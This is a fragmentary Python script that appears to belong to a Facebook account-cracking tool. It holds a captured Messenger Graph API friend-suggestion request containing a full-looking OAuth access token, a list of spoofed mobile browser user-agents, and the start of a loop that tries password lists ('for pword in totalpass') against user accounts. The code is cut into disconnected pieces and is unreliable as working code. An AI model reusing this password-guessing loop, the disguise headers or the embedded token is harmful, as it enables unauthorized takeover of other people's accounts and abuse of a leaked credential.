...
del ua
"""
[FBAN/Orca-Android;FBAV/272. 0.1.48;FBPN/com.facebook.orca;FBLC/en_US;FBCR/Kaberi;FBBV/67467545;FBMF/philips;FBBD/philips;FBDV/SM-G615F, SM-G615FU;FBSV/11.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1520};FB_FW/1;]', 'client_doc_id': '42003896889828048564952729208', 'method': 'post', 'locale': 'en_US', 'pretty': 'false', 'format': 'json', 'variables': '{"profile_id":100078582426339,"suggestion_friends_paginating_first":2500}', 'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery', 'fb_api_caller_class': 'graphservice', 'fb_api_analytics_tags': '["At_Connection","GraphServices"]', 'client_trace_id': '646b7b37-fcb9-4ffd-9a37-f78e55c7de58', 'server_timestamps': 'true', 'purpose': 'fetch'}, 'json': None, 'headers': {'X-Graphql-Client-Library': 'graphservice', 'X-Graphql-Request-Purpose': 'fetch', 'X-Fb-Privacy-Context': '2368177546817046', 'X-Fb-Background-State': '1', 'X-Fb-Net-Hni': '41001', 'X-Fb-Sim-Hni': '41001', 'Authorization': 'OAuth EAATKgyZCPz44BAAr6XwsJvj3Ie8SYAi5vnbLRUCmwGOKNd03aUTHzqOmlulzDvxR16TqkzrhpBYaa4sShGQ8u3J7e1njqeI7PX4xYyTePg0N18N04CNCC4IAMzs1HPIyXGTArOCetZAmuEZB6llMJezMA3E9ZBaj9iYhYrNzwk3l1PgEcc6BPpZBq8p3h268ZD', 'X-Fb-Session-Id': 'nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9', 'X-Fb-Connection-Type': 'WIFI', 'X-Fb-Device-Group': '4481', 'X-Tigon-Is-Retry': 'False', 'X-Fb-Rmd': 'cached=0;state=URL_ELIGIBLE', 'X-Fb-Ta-Logging-Ids': 'graphql:646b7b37-fcb9-4ffd-9a37-f78e55c7de58', 'X-Fb-Friendly-Name': 'SuggestionsFriendListContentQuery', 'X-Fb-Request-Analytics-Tags': 'graphservice', 'Priority': 'u=0', 'Accept-Encoding': 'gzip, deflate', 'X-Fb-Http-Engine': 'Liger', 'X-Fb-Client-Ip': 'True', 'X-Fb-Server-Cluster': 'True', 'X-Fb-Connection-Token': 'ef0e330bff1cd312f36aa5f2c69c59a9', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '567'}}]
"""
...
Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36 EdgA/114.0.1823.68;]
...
Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36 EdgA/114.0.1823.68;]
    ...
    def start(user):
     try:
        ...
        for pword in totalpass:              
            heads = "Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.65 Mobile Safari/537.36"
